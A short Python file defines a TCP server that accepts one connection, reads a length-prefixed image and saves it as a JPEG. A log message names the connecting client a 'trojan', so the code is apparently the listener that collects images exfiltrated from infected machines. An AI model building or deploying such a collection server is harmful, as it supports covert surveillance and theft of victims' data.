import logging
import socket

class Server:
    def __init__(self, port):
        self._port = port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def initialize(self):
        try:
            self._socket.bind(("localhost", self._port))
            self._socket.listen()
            logging.debug("Server was successfully initialized.")
        except socket.error:
            logging.error("Server was not initialized due to an error.")

    def collect_data(self):
        connection, address = self._socket.accept()
        with connection:
            logging.debug("Connection with trojan established from %s", address)

            image_size_bytes = connection.recv(4)
            image_size = int.from_bytes(image_size_bytes)
            print("Image size is",image_size)
            total_received = 0
            image_data = b""

            while total_received < image_size:
                data = connection.recv(1024)  # Use a reasonable chunk size
                if not data:
                    print("Breaking")
                    break
                image_data += data
                total_received += len(data)
                print("Total recieved is",total_received)
                print("image is ",image_data)

            # Save the received image
            with open(f"received_image_{self._received_images_count}.jpg", "wb") as image_file:
                image_file.write(image_data)
                self._received_images_count += 1

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    
    server = Server(27000)
    server.initialize()
    server._received_images_count = 0  # Initialize the image count
    logging.debug("Server is listening on port %d", server._port)
    server.collect_data()
